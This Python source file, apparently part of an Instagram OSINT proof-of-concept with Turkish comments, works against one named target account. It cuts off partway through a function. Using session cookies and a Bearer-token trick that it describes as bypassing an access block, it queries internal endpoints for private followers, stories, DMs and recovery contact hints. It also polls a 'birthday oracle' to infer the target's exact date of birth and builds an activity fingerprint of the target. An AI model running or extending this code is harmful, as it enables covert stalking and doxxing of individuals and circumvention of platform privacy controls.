"""
phase26_29.py — poc.py extension. Hedefe-özel KESİN veri çıkaran 4 yeni faz.

Phase 26: PRESENCE INTEL    (REST get_presence + inbox last_permanent_item_ts
                              + opsiyonel MQTT WSS subscribe)
Phase 27: DSA TRANSPARENCY  (former_usernames, account_creation_country,
                              account_creation_year_month — 8 endpoint variant)
Phase 28: SCHEMA INFLATION  (26-flag include diff: gizli alanlar)
          + BLOKS BYTECODE  (b:NNN field-id harvest, action types, bound vars)
Phase 29: ARCHEOLOGY        (cluster üzerinden target'ın LIKE/COMMENT geçmişi —
                              tam pasif, target hesabına dokunulmuyor)

Çalıştırma:
    python phase26_29.py <username>                  # 4 fazı da koş
    python phase26_29.py <username> --presence-only
    python phase26_29.py <username> --dsa-only
    python phase26_29.py <username> --inflate-only
    python phase26_29.py <username> --archeology-only
    python phase26_29.py <username> --max-accounts 30 --max-media 12

Önkoşullar:
    - ../.env içinde IG_SESSIONID + IG_DS_USER_ID
    - Phase 17 (chaining) önceden koşmuş olmalı (Phase 29 cluster için)
    - opsiyonel: pip install paho-mqtt    (Phase 26 MQTT katmanı için)
"""

import os
import sys
import io
import re
import json
import time
import tempfile
import uuid as _uuid_mod
import datetime
import requests

                                                                          
if hasattr(sys.stdout, 'buffer'):
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8',
                                   errors='replace', line_buffering=True)

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from poc import (
    load_env_cookies,
    build_mobile_pigeon_headers,
    ARTIFACT_ROOT,
    IG_MOBILE_APP_ID,
    discover_pk,
)


                                                                             
                                                                           
                                      
WEB_FAST_MODE = os.environ.get('IG_OSINT_FAST', '0') == '1'
FAST_SKIP_PROBES = frozenset({
    'thread_participants',
    'user_reel',
    'similar_accounts', 'content_ruling', 'web_profile_inflated',
    'users_lookup', 'account_recovery_options', 'live_status',
    'bloks_privacy_center', 'geo_media', 'people_suggested',
    'f_top_followed_by', 'f_bloks_followers', 'f_friendships_show_many',
    'c_graphql_timeline', 'c_feed_user_clips', 'c_feed_reels',
    'c_graphql_v2', 'c_clips_all', 'c_media_insight',
    's_highlights_by_user', 's_story_seen_state', 's_live_broadcast',
    'd_thread_legacy_sorted', 'd_thread_legacy_rev', 'd_thread_i_sorted',
    'd_pending_inbox', 'd_spam_inbox', 'd_thread_by_participants_group',
    'd_message_request_hide_state',
    'th_user_threads', 'th_user_replies', 'tagged_media_by_tag_name',
})


def _fast_probes(probes, label_index=0):
    if not WEB_FAST_MODE:
        return probes
    kept = [item for item in probes
            if item[label_index] not in FAST_SKIP_PROBES]
    skipped = [item[label_index] for item in probes
               if item[label_index] in FAST_SKIP_PROBES]
    if skipped:
        print('        [fast] skipped: ' + ', '.join(skipped))
    return kept


def _headers(cookies):
    """build_mobile_pigeon_headers + eksik x-csrftoken / x-mid / ig_did."""
    h = build_mobile_pigeon_headers(cookies)
    h['x-csrftoken'] = cookies.get('csrftoken', '')
    h['x-mid'] = cookies.get('mid', '')
                                                                
    if cookies.get('ig_did'):
        h['x-ig-device-id'] = cookies['ig_did']
        h['x-ig-family-device-id'] = cookies['ig_did']
    return h


def _signed_prefix(cookies):
    """IG mobile POST body'nin başına eklenmesi gereken signed-body alanları."""
    return (f'_csrftoken={cookies.get("csrftoken", "")}'
            f'&_uuid={_uuid_mod.uuid4()}'
            f'&_uid={cookies.get("ds_user_id", "")}'
            f'&_csrftoken={cookies.get("csrftoken", "")}')


                                                                          
_IG_SNOWFLAKE_EPOCH_MS = 1314220021721

                                                                            
_NON_UI_INTERESTING_KEYS = (
    'birthday_today_visibility_for_viewer',                                          
    'existing_user_age_collection_enabled',                             
    'account_type',                                                           
    'account_age_month',                                                      
    'eimu_id',                                                               
    'interop_messaging_user_fbid',                                               
    'fbid_v2',                                                     
    'is_in_canada', 'is_in_eu',                                           
    'has_private_collections',                                                
    'show_post_insights_entry_point',                              
    'professional_conversion_suggested_account_type',                   
    'qa_freeform_banner_available_prompts',                              
    'qa_freeform_banner_transparency',                                  
    'nametag',                                                      
    'include_direct_blacklist_status',                           
    'recs_from_friends',                                           
    'fan_club_info',                                                   
    'meta_verified_benefits_info',                                             
    'not_meta_verified_friction_info',                               
    'profile_overlay_info',                                                
    'threads_profile_glyph_url',                                                  
    'short_drama_role',                                              
    'profile_reels_sorting_eligibility',                               
    'views_on_grid_status',                                              
    'active_standalone_fundraisers',                                  
    'live_subscription_status',                                           
    'posts_subscription_status',                                      
    'reels_subscription_status',                                    
    'stories_subscription_status',                                   
    'highlights_tray_type',                                          
    'profile_pic_id',                                                         
)

_INFO_MAX_INCLUDE = (
    '?from_module=profile'
    '&include_about_section=true'
    '&include_friendship_info=true'
    '&include_chaining=true'
    '&include_country_block=true'
    '&include_persistent_actions=true'
    '&include_high_interest_accounts=true'
    '&include_account_age_month=true'
    '&include_account_dynamic=true'
    '&include_user_tagged_count=true'
    '&include_reel=true'
    '&include_is_unified_inbox_available=true'
)


def _decode_snowflake_pic_id(pic_id_str):
    """profile_pic_id → exact avatar upload timestamp via IG Snowflake."""
    if not pic_id_str or '_' not in str(pic_id_str):
        return {}
    parts = str(pic_id_str).split('_', 1)
    try:
        media_id = int(parts[0])
        uploader_pk = parts[1]
        ts_ms = (media_id >> 23) + _IG_SNOWFLAKE_EPOCH_MS
        import datetime as _dt
        dt = _dt.datetime.fromtimestamp(ts_ms / 1000, tz=_dt.timezone.utc)
        age_days = round((time.time() - ts_ms / 1000) / 86400, 1)
        return {
            'media_id': str(media_id),
            'uploader_pk': uploader_pk,
            'uploader_is_target': (uploader_pk == parts[0].split('_')[0]
                                    if '_' in uploader_pk else True),
            'avatar_uploaded_iso': dt.isoformat(),
            'avatar_age_days': age_days,
        }
    except (ValueError, TypeError):
        return {}


def _get_bearer_token(cookies, target_pk, proxies=None):
    """www.instagram.com üzerinden i.instagram.com Bearer token al.

    web-session (sessionid:6:) i.instagram.com'da 4415001 (Prompt has
    contribution) döndürür. www.instagram.com'a yapılan herhangi bir başarılı
    istek yanıtında ig-set-authorization: Bearer IGT:2:... header'ı gelir.
    Bu token'ı i.ig isteklerinde Authorization header'ı olarak kullanmak
    4415001 bloğunu tamamen atlatır.

    Returns: dict with 'bearer' key (or empty on failure).
    """
    h = _headers(cookies)
    try:
        r = requests.get(
            f'https://www.instagram.com/api/v1/direct_v2/threads/'
            f'get_by_participants/?recipient_users=%5B{target_pk}%5D'
            f'&seq_id=0&limit=1',
            headers=h, cookies=cookies, timeout=15, proxies=proxies)
    except requests.exceptions.RequestException as e:
        return {'error': type(e).__name__}
    return {
        'bearer': r.headers.get('ig-set-authorization', ''),
        'www_claim': r.headers.get('x-ig-set-www-claim', ''),
        'thread_data': r.json() if r.status_code == 200 else {},
    }


def _headers_with_bearer(cookies, bearer_info):
    """_headers() + Bearer token → 4415001 bypass."""
    h = _headers(cookies)
    if bearer_info.get('bearer'):
        h['authorization'] = bearer_info['bearer']
    if bearer_info.get('www_claim'):
        h['x-ig-www-claim'] = bearer_info['www_claim']
    return h


def probe_non_ui_fields(target_pk, cookies, bearer_info=None, proxies=None):
    """Hedefe ait /info/ endpoint'inden UI'ın hiç göstermediği alanları çıkar.

    Kritik bulgular:
      birthday_today_visibility_for_viewer — BIRTHDAY ORACLE: NOT_VISIBLE→VISIBLE
        geçişini izleyerek (365 sorgu/yıl) tam doğum günü inference edilebilir.
      existing_user_age_collection_enabled — IG'nin yaş/DOB verisi kayıtlı.
      profile_pic_id Snowflake decode — avatar upload exact timestamp.
      account_type, eimu_id, interop_messaging_user_fbid — UI'da yok.
    """
    h = (_headers_with_bearer(cookies, bearer_info) if bearer_info
          else _headers(cookies))
    url = (f'https://i.instagram.com/api/v1/users/{target_pk}/info/'
            + _INFO_MAX_INCLUDE)
    try:
        r = requests.get(url, headers=h, cookies=cookies,
                          timeout=15, proxies=proxies)
    except requests.exceptions.RequestException as e:
        return {'error': type(e).__name__}
    if r.status_code != 200:
        return {'http_status': r.status_code, 'head': r.text[:200]}
    try:
        u = r.json().get('user') or {}
    except (json.JSONDecodeError, ValueError):
        return {'http_status': r.status_code, 'parse_error': True}

    out = {
        'http_status': r.status_code,
        'total_keys': len(u),
        'found_fields': {},
        'pic_id_decode': {},
        'birthday_oracle': {},
    }

                         
    for k in _NON_UI_INTERESTING_KEYS:
        if k in u and u[k] not in (None, '', False, 0, [], {}):
            out['found_fields'][k] = u[k]

                                     
    if u.get('profile_pic_id'):
        out['pic_id_decode'] = _decode_snowflake_pic_id(u['profile_pic_id'])

                                                          
    bday = u.get('birthday_today_visibility_for_viewer')
    out['birthday_oracle'] = {
        'value': bday,
        'has_birthday_data': bday is not None,
        'birthday_is_today': bday not in (None, 'NOT_VISIBLE', 'NOT_VISIBLE_CLOSE'),
        'inference_note': (
            'Poll daily. NOT_VISIBLE→other value = birthday is today. '
            'Max 365 API calls to determine exact DOB.')
    }

    return out


def probe_story_activity_timing(target_pk, cookies, bearer_info=None,
                                 proxies=None):
    """Story/highlight latest_reel_media timestamp leak on private accounts.

    Even for private accounts, the highlights tray response leaks:
      latest_reel_media  — epoch of the most recent story or highlight upload
      seen_ranked_position — viewer's read-position (can infer view timing)
      latest_best_reel_media — same for ranked feed

    Polling this endpoint daily (or hourly) builds a precise activity fingerprint
    showing WHEN the target posts stories — without being a follower.

    Also probes /reelstray/ which returns `expiring_date` for active stories
    on some surface combinations (UI does not expose this for private accounts).
    """
    h = (_headers_with_bearer(cookies, bearer_info)
         if bearer_info and bearer_info.get('bearer') else _headers(cookies))
    out = {}

    endpoints = [
        ('highlights_tray',
         f'https://i.instagram.com/api/v1/highlights/{target_pk}/highlights_tray/'),
        ('reel_info',
         f'https://i.instagram.com/api/v1/feed/reels_media/?user_ids={target_pk}'),
        ('story_feed',
         f'https://i.instagram.com/api/v1/feed/user/{target_pk}/story/'),
        ('reels_tray',
         f'https://i.instagram.com/api/v1/feed/reels_tray/?reason=cold_start'
         f'&target_user_id={target_pk}'),
        ('user_reel',
         f'https://i.instagram.com/api/v1/feed/user/{target_pk}/'
         f'?count=1&exclude_comment=true'),
    ]

    for label, url in _fast_probes(endpoints):
        try:
            r = requests.get(url, headers=h, cookies=cookies,
                             timeout=15, proxies=proxies)
        except requests.exceptions.RequestException as e:
            out[label] = {'error': type(e).__name__}
            time.sleep(0.3)
            continue

        entry = {'http_status': r.status_code, 'size': len(r.text)}
        if r.status_code == 200:
            try:
                d = r.json()
                entry['raw_keys'] = (list(d.keys())[:20]
                                     if isinstance(d, dict) else None)

                                                                                
                tray = d.get('tray') or []
                for item in tray:
                    if str(item.get('id') or item.get('pk', '')) == str(target_pk):
                        lrm = item.get('latest_reel_media')
                        entry['latest_reel_media'] = lrm
                        entry['latest_reel_media_iso'] = _ts_iso(lrm, 's')
                        entry['seen_ranked_position'] = item.get(
                            'seen_ranked_position')
                        entry['expiring_at'] = item.get('expiring_at')
                        entry['expiring_at_iso'] = _ts_iso(
                            item.get('expiring_at'), 's')
                        entry['has_viewed'] = item.get('seen')
                        break

                                        
                rm = d.get('reels') or d.get('reels_media') or {}
                if isinstance(rm, dict):
                    t_reel = rm.get(str(target_pk)) or {}
                else:
                    t_reel = {}
                if t_reel:
                    lrm = t_reel.get('latest_reel_media')
                    entry['latest_reel_media'] = lrm
                    entry['latest_reel_media_iso'] = _ts_iso(lrm, 's')
                    entry['user_reel_count'] = len(t_reel.get('items') or [])

                                       
                trays = d.get('tray') or []
                if trays and label == 'highlights_tray':
                    entry['highlight_count'] = len(trays)
                                                         
                    if trays:
                        entry['first_hl_latest_reel_media'] = trays[0].get(
                            'latest_reel_media')
                        entry['first_hl_lrm_iso'] = _ts_iso(
                            trays[0].get('latest_reel_media'), 's')

                                                                  
                items = d.get('items') or []
                if items:
                    entry['item_count'] = len(items)
                    ts_list = [it.get('taken_at') or it.get('timestamp')
                               for it in items if
                               (it.get('taken_at') or it.get('timestamp'))]
                    if ts_list:
                        entry['newest_item_ts'] = max(ts_list)
                        entry['newest_item_iso'] = _ts_iso(max(ts_list), 's')

                entry['present'] = bool(
                    entry.get('latest_reel_media')
                    or entry.get('item_count')
                    or entry.get('highlight_count'))

                                                                         
                uai = d.get('unviewable_authors_info')
                if uai:
                    entry['unviewable_authors_info'] = uai

                                                      
                if d.get('broadcast'):
                    entry['broadcast'] = d['broadcast']

                                                    
                reel = d.get('reel')
                if reel:
                    entry['reel_id'] = reel.get('id')
                    entry['reel_expiry'] = reel.get('expiring_at')
                    entry['reel_expiry_iso'] = _ts_iso(
                        reel.get('expiring_at'), 's')

                                                                           
                                                                           
                                                                      
                if label == 'story_feed' and isinstance(d, dict):
                    has_items = bool(reel and (reel.get('items') or [])) \
                                or bool(d.get('reels')) or bool(d.get('items'))
                    if has_items:
                        entry['_raw_payload'] = d
            except (json.JSONDecodeError, ValueError):
                entry['parse_error'] = True
                entry['head'] = r.text[:200]
        else:
            entry['head'] = r.text[:150]
        out[label] = entry
        time.sleep(0.35)

    return out


def probe_extended_bearer(target_pk, target_username, cookies,
                           bearer_info=None, proxies=None):
    """Extended Bearer-enabled endpoint probe.

    Tries endpoints that are normally gated for web sessions or non-followers:
      - follower/following list (private account bypass attempt)
      - suggested_users (cluster leak)
      - similar_accounts (interest graph)
      - check_restricted_actions (moderation flags)
      - content_ruling (internal moderation status)
      - web_profile_info inflation (all available include flags)
      - recovery/lookup (obfuscated phone/email if not rate limited)
    """
    h = (_headers_with_bearer(cookies, bearer_info)
         if bearer_info and bearer_info.get('bearer') else _headers(cookies))
    out = {}

    probes = [
                                                    
        ('following_list',
         'GET',
         f'https://i.instagram.com/api/v1/friendships/{target_pk}/following/'
         f'?count=12&rank_token=&search_surface=follow_list_page',
         None),
        ('followers_list',
         'GET',
         f'https://i.instagram.com/api/v1/friendships/{target_pk}/followers/'
         f'?count=12&rank_token=&search_surface=follow_list_page',
         None),
        ('mutual_followers',
         'GET',
         f'https://i.instagram.com/api/v1/friendships/{target_pk}/'
         f'mutual_followers/?rank_token=',
         None),
                                        
        ('suggested_users',
         'GET',
         f'https://i.instagram.com/api/v1/discover/chaining/'
         f'?target_id={target_pk}',
         None),
        ('similar_accounts',
         'GET',
         f'https://i.instagram.com/api/v1/users/{target_pk}/similar_accounts/',
         None),
                                           
        ('content_ruling',
         'GET',
         f'https://i.instagram.com/api/v1/web/get_ruling_for_content/'
         f'?content_type=USER&target_id={target_pk}',
         None),
                                                
        ('web_profile_inflated',
         'GET',
         f'https://www.instagram.com/api/v1/users/web_profile_info/'
         f'?username={target_username}'
         f'&include_about=true&include_transparency=true'
         f'&include_chaining=true&include_friendship_info=true'
         f'&include_persistent_actions=true',
         None),
                                                                  
                                                                           
        ('users_lookup',
         'POST',
         'https://i.instagram.com/api/v1/users/lookup/',
         f'q={target_username}&skip_recovery=0&country_code=TR'),
                                                    
        ('account_recovery_options',
         'GET',
         f'https://i.instagram.com/api/v1/accounts/get_recovery_options/'
         f'?user_id={target_pk}',
         None),
                                                                          
        ('notes_feed',
         'GET',
         'https://i.instagram.com/api/v1/notes/get_notes/'
         f'?target_note_author_id={target_pk}',
         None),
                             
        ('live_status',
         'GET',
         f'https://i.instagram.com/api/v1/live/get_live_presence/'
         f'?broadcast_ids%5B%5D=&user_ids%5B%5D={target_pk}',
         None),
                                                    
        ('bloks_privacy_center',
         'GET',
         f'https://i.instagram.com/api/v1/bloks/apps/'
         f'com.instagram.privacy.privacy_center/'
         f'?params=%7B%22target_user_id%22%3A%22{target_pk}%22%7D',
         None),
                                                                           
                                                                  
        ('usertags_feed',
         'GET',
         f'https://i.instagram.com/api/v1/usertags/{target_pk}/feed/'
         f'?count=12&rank_token=',
         None),
                                                    
        ('geo_media',
         'GET',
         f'https://i.instagram.com/api/v1/maps/user/'
         f'?target_user_id={target_pk}',
         None),
                                                                          
        ('blended_search',
         'GET',
         f'https://www.instagram.com/api/v1/web/search/topsearch/'
         f'?context=blended&query={target_username}&count=5'
         f'&search_surface=user_search_page',
         None),
                                                      
        ('people_suggested',
         'GET',
         f'https://i.instagram.com/api/v1/discover/ayml/'
         f'?module=suggested_user_profile&target_user_id={target_pk}&count=12',
         None),
    ]

    for label, method, url, body in _fast_probes(probes):
        hh = dict(h)
        if method == 'POST':
            hh['content-type'] = ('application/x-www-form-urlencoded; '
                                   'charset=UTF-8')
        try:
            if method == 'GET':
                r = requests.get(url, headers=hh, cookies=cookies,
                                 timeout=15, proxies=proxies)
            else:
                r = requests.post(url, headers=hh, data=body or '',
                                  cookies=cookies, timeout=15, proxies=proxies)
        except requests.exceptions.RequestException as e:
            out[label] = {'error': type(e).__name__}
            time.sleep(0.3)
            continue

        entry = {'http_status': r.status_code, 'size': len(r.text)}
        if r.status_code == 200:
            try:
                d = r.json()
                entry['raw_keys'] = (list(d.keys())[:25]
                                     if isinstance(d, dict) else None)

                                                  
                if label in ('following_list', 'followers_list'):
                    users = d.get('users') or []
                    entry['count_in_page'] = len(users)
                    entry['next_max_id'] = d.get('next_max_id')
                    if users:
                        entry['sample'] = [
                            {'pk': u.get('pk'), 'username': u.get('username')}
                            for u in users[:5]
                        ]

                                          
                if label == 'mutual_followers':
                    users = d.get('users') or []
                    entry['count'] = len(users)
                    if users:
                        entry['sample'] = [
                            {'pk': u.get('pk'), 'username': u.get('username')}
                            for u in users[:5]
                        ]

                                                      
                if label in ('suggested_users', 'similar_accounts'):
                    users = (d.get('chaining_users')
                             or d.get('users') or [])
                    entry['count'] = len(users)
                    if users:
                                                                          
                        entry['users'] = [
                            {'pk': u.get('pk'),
                             'username': u.get('username'),
                             'full_name': u.get('full_name'),
                             'is_private': u.get('is_private'),
                             'follower_count': u.get('follower_count'),
                             'following_count': u.get('following_count'),
                             'media_count': u.get('media_count'),
                             'mutual_followers_count': u.get(
                                 'mutual_followers_count'),
                             'chaining_score': u.get('chaining_score'),
                             'friendship_status': u.get('friendship_status'),
                            }
                            for u in users
                        ]
                        entry['sample'] = entry['users'][:8]

                                        
                if label == 'content_ruling':
                    entry['ruling'] = d.get('ruling')
                    entry['content_decision'] = d.get('content_decision')

                                              
                if label == 'web_profile_inflated':
                    u = ((d.get('data') or {}).get('user')
                          or d.get('user') or {})
                    extra = {k: u[k] for k in (
                        'date_joined', 'account_creation_country',
                        'account_creation_year_month', 'former_usernames',
                        'eimu_id', 'interop_messaging_user_fbid',
                        'is_in_eu', 'is_in_canada',
                        'business_address_json', 'public_email',
                        'public_phone_number',
                    ) if k in u}
                    if extra:
                        entry['extra_fields'] = extra

                                                           
                if label == 'users_lookup':
                    entry['obfuscated_email'] = d.get('obfuscated_email')
                    entry['obfuscated_phone'] = d.get('obfuscated_phone')
                    entry['has_password'] = d.get('has_password')
                    entry['can_email_reset'] = d.get('can_email_reset')
                    entry['can_sms_reset'] = d.get('can_sms_reset')

                                     
                if label == 'live_status':
                    entry['live_presence'] = (
                        d.get('live_presence') or d.get('presence') or {})

                               
                if label == 'notes_feed':
                    items = d.get('items') or []
                    entry['note_count'] = len(items)
                    if items:
                        entry['notes'] = [
                            {'text': n.get('note', {}).get('text', '')[:80],
                             'created_at': _ts_iso(n.get('created_at'), 's')}
                            for n in items[:5]
                        ]

                                                         
                if label == 'usertags_feed':
                    items = d.get('items') or []
                    entry['item_count'] = len(items)
                    entry['total_count'] = d.get('total_count')
                    entry['num_results'] = d.get('num_results')
                    entry['more_available'] = d.get('more_available')
                    entry['requires_review'] = d.get('requires_review')
                    if items:
                        entry['tagged_posts'] = [
                            {
                                'media_id': it.get('id') or it.get('pk'),
                                'taken_at': _ts_iso(it.get('taken_at'), 's'),
                                'media_type': it.get('media_type'),
                                'location': ((it.get('location') or {})
                                             .get('name')),
                                'tagger_pk': (it.get('user') or {}).get('pk'),
                                'tagger_username': (it.get('user') or {}).get(
                                    'username'),
                                'like_count': it.get('like_count'),
                                'comment_count': it.get('comment_count'),
                            }
                            for it in items[:12]
                        ]

                                                                     
                if label == 'blended_search':
                    for hit in (d.get('users') or []):
                        u = hit.get('user') or hit
                        if str(u.get('pk')) == str(target_pk):
                            extra_search = {k: u[k] for k in (
                                'last_active_status_type', 'is_in_eu',
                                'is_in_canada', 'reachability_status',
                                'profile_pic_url_hd',
                                'has_anonymous_profile_picture',
                                'social_context', 'friendship_status',
                            ) if k in u}
                            if extra_search:
                                entry['target_search_fields'] = extra_search
                            break

                                                
                if label in ('geo_media', 'people_suggested'):
                    users = d.get('suggested_users') or d.get('users') or []
                    if isinstance(users, list) and users:
                        entry['count'] = len(users)
                        entry['sample'] = [
                            {'pk': u.get('pk'),
                             'username': u.get('username')}
                            for u in users[:5]
                        ]
                    geo_items = d.get('items') or d.get('media') or []
                    if geo_items:
                        entry['geo_posts'] = [
                            {'taken_at': _ts_iso(it.get('taken_at'), 's'),
                             'location': ((it.get('location') or {})
                                          .get('name')),
                             'media_type': it.get('media_type')}
                            for it in geo_items[:5]
                        ]

            except (json.JSONDecodeError, ValueError):
                entry['parse_error'] = True
                entry['head'] = r.text[:300]
        else:
            entry['head'] = r.text[:200]

        out[label] = entry
        time.sleep(0.35)

    return out


def probe_private_content_bypass(target_pk, target_username, cookies,
                                   bearer_info=None, proxies=None):
    """
    Agresif bypass denemeleri: gerçek takipçi, private içerik, story, DM.

    Katmanlar:
      F - Follower/Following gerçek liste bypass
      C - Private içerik (posts/media) erişim
      S - Story & Highlight içerik erişim
      D - DM thread içerik erişim
    """
    h = (_headers_with_bearer(cookies, bearer_info)
         if bearer_info and bearer_info.get('bearer') else _headers(cookies))
    out = {}

                                                                          
                                              
                                                                          
                                                                       
    follower_probes = [
                                                                                   
        ('f_search_a',
         f'https://i.instagram.com/api/v1/friendships/{target_pk}/followers/'
         f'?count=50&query=a&search_surface=follow_list_page&rank_token='),
                                                                             
        ('f_search_empty',
         f'https://i.instagram.com/api/v1/friendships/{target_pk}/followers/'
         f'?count=50&query=&search_surface=follow_list_page'),
                                                                       
        ('f_mutual_fetch',
         f'https://i.instagram.com/api/v1/friendships/{target_pk}/followers/'
         f'?count=50&rank_token=&include_reel=true&fetch_mutual=true'),
                                                                     
        ('f_following',
         f'https://i.instagram.com/api/v1/friendships/{target_pk}/following/'
         f'?count=50&rank_token=&includes_hashtags=true'),
                                                                                      
        ('f_top_followed_by',
         f'https://i.instagram.com/api/v1/users/{target_pk}/top_followed_by/'),
                                                                              
        ('f_bloks_followers',
         f'https://i.instagram.com/api/v1/bloks/apps/'
         f'com.instagram.interactions.follower_list/'
         f'?params=%7B%22user_id%22%3A%22{target_pk}%22%2C%22count%22%3A50%7D'),
                                                                  
        ('f_graphql',
         f'https://www.instagram.com/graphql/query/'
         f'?query_hash=37479f2b8209594dde7facb0d904896a'
         f'&variables=%7B%22id%22%3A%22{target_pk}%22%2C%22first%22%3A50%7D'),
                                                            
        ('f_friendships_show_many',
         f'https://i.instagram.com/api/v1/friendships/show_many/'
         f'?user_ids[]={target_pk}'),
    ]

    for label, url in _fast_probes(follower_probes):
        try:
            hh = dict(h)
            if 'graphql' in url:
                                                          
                hh['accept'] = '*/*'
            r = requests.get(url, headers=hh, cookies=cookies,
                             timeout=15, proxies=proxies)
        except requests.exceptions.RequestException as e:
            out[label] = {'error': type(e).__name__}
            time.sleep(0.3)
            continue

        entry = {'http_status': r.status_code, 'size': len(r.text)}
        if r.status_code == 200:
            try:
                d = r.json()
                entry['raw_keys'] = list(d.keys())[:20] if isinstance(d, dict) else None
                             
                users = (d.get('users')
                         or d.get('data', {}).get('user', {})
                            .get('edge_followed_by', {}).get('edges', [])
                         or [])
                if isinstance(users, list) and users:
                                        
                    if users and isinstance(users[0], dict) and 'node' in users[0]:
                        users = [u['node'] for u in users]
                    entry['count'] = len(users)
                    entry['users'] = [
                        {'pk': u.get('pk') or u.get('id'),
                         'username': u.get('username'),
                         'full_name': u.get('full_name'),
                         'is_private': u.get('is_private')}
                        for u in users
                    ]
                else:
                    entry['count'] = 0
                                                       
                    gql_count = (d.get('data', {}).get('user', {})
                                  .get('edge_followed_by', {})
                                  .get('count'))
                    if gql_count:
                        entry['gql_total_count'] = gql_count
            except (json.JSONDecodeError, ValueError):
                entry['parse_error'] = True
                entry['head'] = r.text[:300]
        else:
            entry['head'] = r.text[:200]
        out[label] = entry
        time.sleep(0.4)

                                                                          
                                             
                                                                          
    content_probes = [
                                                               
        ('c_graphql_timeline',
         f'https://www.instagram.com/graphql/query/'
         f'?query_hash=e769aa130647d2354c40ea6a439bfc08'
         f'&variables=%7B%22id%22%3A%22{target_pk}%22%2C%22first%22%3A12%7D'),
                                                                                   
        ('c_feed_user_clips',
         f'https://i.instagram.com/api/v1/clips/user/'
         f'?target_user_id={target_pk}&page_size=12'),
                                
        ('c_feed_reels',
         f'https://i.instagram.com/api/v1/feed/user/{target_pk}/reels_media/'
         f'?include_fixed_destinations=true'),
                                                                            
        ('c_usertags_ranked',
         f'https://i.instagram.com/api/v1/usertags/{target_pk}/feed/'
         f'?count=12&rank_token=&rank_type=ranked_media'),
                                                                 
        ('c_graphql_v2',
         f'https://www.instagram.com/api/v1/feed/user/{target_pk}/'
         f'?count=12&rank_token=&max_id='),
                                                                             
        ('c_clips_all',
         f'https://i.instagram.com/api/v1/clips/all/'
         f'?target_user_id={target_pk}&page_size=12&include_feed_video=true'),
                                     
        ('c_media_insight',
         f'https://i.instagram.com/api/v1/insights/account_summary/'
         f'?user_id={target_pk}'),
    ]

    for label, url in _fast_probes(content_probes):
        try:
            r = requests.get(url, headers=h, cookies=cookies,
                             timeout=15, proxies=proxies)
        except requests.exceptions.RequestException as e:
            out[label] = {'error': type(e).__name__}
            time.sleep(0.3)
            continue

        entry = {'http_status': r.status_code, 'size': len(r.text)}
        if r.status_code == 200:
            try:
                d = r.json()
                entry['raw_keys'] = list(d.keys())[:20] if isinstance(d, dict) else None
                                          
                items = (d.get('items') or d.get('media') or
                         d.get('reels_media') or [])
                if isinstance(items, list) and items:
                    entry['item_count'] = len(items)
                    entry['media_items'] = [
                        {
                            'media_id': (it.get('id') or it.get('pk')
                                          or it.get('media_id')),
                            'taken_at': _ts_iso(it.get('taken_at'), 's'),
                            'media_type': it.get('media_type'),
                            'like_count': it.get('like_count'),
                            'comment_count': it.get('comment_count'),
                            'caption': ((it.get('caption') or {})
                                        .get('text', '')[:80]
                                        if isinstance(it.get('caption'), dict)
                                        else str(it.get('caption') or '')[:80]),
                            'location': ((it.get('location') or {})
                                         .get('name')),
                            'image_url': (
                                ((it.get('image_versions2') or {})
                                 .get('candidates') or [{}])[0]
                                .get('url', '')[:120]
                            ),
                        }
                        for it in items[:12]
                    ]
                               
                gql_user = ((d.get('data') or {}).get('user') or {})
                gql_media = (gql_user.get('edge_owner_to_timeline_media') or
                             gql_user.get('edge_felix_video_timeline') or {})
                if gql_media:
                    entry['gql_count'] = gql_media.get('count')
                    edges = gql_media.get('edges') or []
                    entry['gql_item_count'] = len(edges)
                    if edges:
                        entry['gql_media'] = [
                            {
                                'shortcode': e.get('node', {}).get('shortcode'),
                                'taken_at': _ts_iso(
                                    e.get('node', {}).get('taken_at_timestamp'), 's'),
                                'type': e.get('node', {}).get('__typename'),
                                'like_count': e.get('node', {}).get(
                                    'edge_liked_by', {}).get('count'),
                                'thumb_url': e.get('node', {}).get(
                                    'thumbnail_src', '')[:120],
                            }
                            for e in edges[:12]
                        ]
                                   
                clips = d.get('items') or []
                if clips and label in ('c_clips_all', 'c_feed_reels'):
                    entry['clip_count'] = len(clips)
            except (json.JSONDecodeError, ValueError):
                entry['parse_error'] = True
                entry['head'] = r.text[:300]
        else:
            entry['head'] = r.text[:200]
        out[label] = entry
        time.sleep(0.4)

                                                                          
                                         
                                                                          
    story_probes = [
                                                        
        ('s_reels_media_profile',
         f'https://i.instagram.com/api/v1/feed/reels_media/'
         f'?user_ids={target_pk}&reason=profile_view&source=story_bubble'),
        ('s_reels_media_cold',
         f'https://i.instagram.com/api/v1/feed/reels_media/'
         f'?user_ids={target_pk}&reason=cold_start&include_viewer_seen=true'),
                                          
        ('s_highlight_tray_v2',
         f'https://i.instagram.com/api/v1/highlights/{target_pk}/'
         f'highlights_tray/?supported_capabilities_new=true'
         f'&include_cover=true'),
                                              
        ('s_story_feed_cf',
         f'https://i.instagram.com/api/v1/feed/user/{target_pk}/story/'
         f'?source=profile&mark_seen=false'),
                                                                
                                                                                      
                                                                             
        ('s_highlights_by_user',
         f'https://i.instagram.com/api/v1/highlights/all_highlights/'
         f'?user_id={target_pk}'),
                                  
        ('s_story_seen_state',
         f'https://i.instagram.com/api/v1/stories/{target_pk}/story_seen_state/'),
                             
        ('s_graphql_story',
         f'https://www.instagram.com/graphql/query/'
         f'?query_hash=45246d3fe16ccc6577e0bd297a5db1ab'
         f'&variables=%7B%22user_ids%22%3A%5B%22{target_pk}%22%5D%7D'),
                                                             
        ('s_live_broadcast',
         f'https://i.instagram.com/api/v1/live/{target_pk}/'
         f'heartbeat_and_get_viewer_count/?broadcast_id=0'),
    ]

    for label, url in _fast_probes(story_probes):
        try:
            r = requests.get(url, headers=h, cookies=cookies,
                             timeout=15, proxies=proxies)
        except requests.exceptions.RequestException as e:
            out[label] = {'error': type(e).__name__}
            time.sleep(0.3)
            continue

        entry = {'http_status': r.status_code, 'size': len(r.text)}
        if r.status_code == 200:
            try:
                d = r.json()
                entry['raw_keys'] = list(d.keys())[:20] if isinstance(d, dict) else None
                                  
                reels = d.get('reels') or d.get('reels_media') or {}
                if isinstance(reels, dict):
                    reel = reels.get(str(target_pk)) or {}
                elif isinstance(reels, list):
                    reel = next((r_ for r_ in reels
                                  if str(r_.get('id') or r_.get('pk', ''))
                                  == str(target_pk)), {})
                else:
                    reel = {}
                if reel:
                    entry['story_items'] = [
                        {
                            'media_id': it.get('id') or it.get('pk'),
